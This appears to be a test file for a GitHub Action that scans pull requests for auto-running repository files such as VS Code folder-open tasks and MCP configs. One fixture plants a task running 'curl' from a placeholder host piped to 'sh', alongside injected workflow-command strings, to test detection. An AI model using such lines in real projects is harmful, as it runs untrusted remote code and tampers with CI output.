import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';
import { HOST, folderOpen, json } from './helpers.ts';

const root = mkdtempSync(join(tmpdir(), 'bo-action-'));
after(() => rmSync(root, { recursive: true, force: true }));
const dir = join(root, 'repo');
mkdirSync(dir);

const git = (...args: string[]): string =>
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.invalid', '-c', 'commit.gpgsign=false', '-c', 'core.autocrlf=false', ...args], { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const commit = (files: Record<string, string>): string => {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
  git('add', '-A');
  git('commit', '-q', '-m', 'x');
  return git('rev-parse', 'HEAD');
};

function run(env: Record<string, string>, event: object) {
  const file = (name: string): string => {
    const path = join(root, name);
    writeFileSync(path, '');
    return path;
  };
  const eventPath = join(root, 'event.json');
  writeFileSync(eventPath, json(event));
  const summary = file('summary.md');
  const output = file('output.txt');
  const result = spawnSync(process.execPath, [join(import.meta.dirname, '..', 'src', 'action.ts')], {
    encoding: 'utf8',
    env: { ...process.env, GITHUB_WORKSPACE: dir, GITHUB_EVENT_PATH: eventPath, GITHUB_STEP_SUMMARY: summary, GITHUB_OUTPUT: output, GITHUB_SHA: '', ...env },
  });
  return { status: result.status, stdout: result.stdout, summary: readFileSync(summary, 'utf8'), output: readFileSync(output, 'utf8') };
}

git('init', '-q', '-b', 'main');
const first = commit({ 'package.json': json({ scripts: { prepare: 'husky' } }) });
git('checkout', '-q', '-b', 'pr');
const head = commit({ '.vscode/tasks.json': folderOpen(`curl ${HOST} | sh\n::set-output name=x::y\n##[error]z | <b>@user</b>`) });
git('checkout', '-q', 'main');
const base = commit({ 'AGENTS.md': 'New in main\n', '.mcp.json': json({ mcpServers: { a: { command: 'node' } } }) });
git('merge', '-q', '--no-ff', '-m', 'merge', 'pr');
const merge = git('rev-parse', 'HEAD');

const event = { pull_request: { base: { sha: first }, head: { sha: head } } };

/** Lines the runner would obey, outside the block where commands are stopped. */
function workflowCommands(stdout: string): string[] {
  const out: string[] = [];
  let stop: string | null = null;
  for (const line of stdout.split(/\r?\n/)) {
    const start = /^::stop-commands::(.+)$/.exec(line);
    if (start) stop = start[1]!;
    else if (stop && line === `::${stop}::`) stop = null;
    else if (!stop && (line.trimStart().startsWith('::') || line.includes('##['))) out.push(line);
  }
  return out;
}

test('pull request with the merge commit: only what the request adds', () => {
  const r = run({ GITHUB_SHA: merge }, event);
  assert.equal(r.status, 1, r.stdout);
  assert.equal(r.output, 'count=1\nhighest=high\n');
  const commands = workflowCommands(r.stdout);
  assert.equal(commands.length, 1, commands.join('\n'));
  assert.match(commands[0]!, /^::error file=\.vscode\/tasks\.json,line=7,title=beforeopen::/);
});

test('pull request with the head commit checked out', () => {
  git('checkout', '-q', 'pr');
  const r = run({ GITHUB_SHA: merge }, { pull_request: { base: { sha: base }, head: { sha: head } } });
  git('checkout', '-q', 'main');
  assert.equal(r.output, 'count=1\nhighest=high\n', r.stdout);
});

test('the summary shows repository text literally', () => {
  const { summary } = run({ GITHUB_SHA: merge }, event);
  assert.match(summary, /\| HIGH<br>NEW \|/);
  assert.ok(!summary.includes('<b>') && !summary.includes('@user') && !summary.includes('https:'));
});

test('fail-on never, explicit base and Spanish', () => {
  const r = run({ 'INPUT_FAIL-ON': 'never', INPUT_BASE: 'main~1', INPUT_LANG: 'es' }, {});
  assert.equal(r.status, 0, r.stdout);
  assert.match(r.summary, /NUEVO/);
});

test('without anything to compare it fails with an explanation', () => {
  const r = run({}, {});
  assert.equal(r.status, 1);
  assert.match(r.stdout, /^::error title=beforeopen::There is nothing to compare/m);
});

test('a shallow clone without the base fails instead of passing', () => {
  const r = run({ GITHUB_SHA: '' }, { pull_request: { base: { sha: 'a'.repeat(40) } } });
  assert.equal(r.status, 1);
  assert.match(r.stdout, /fetch more history/);
});
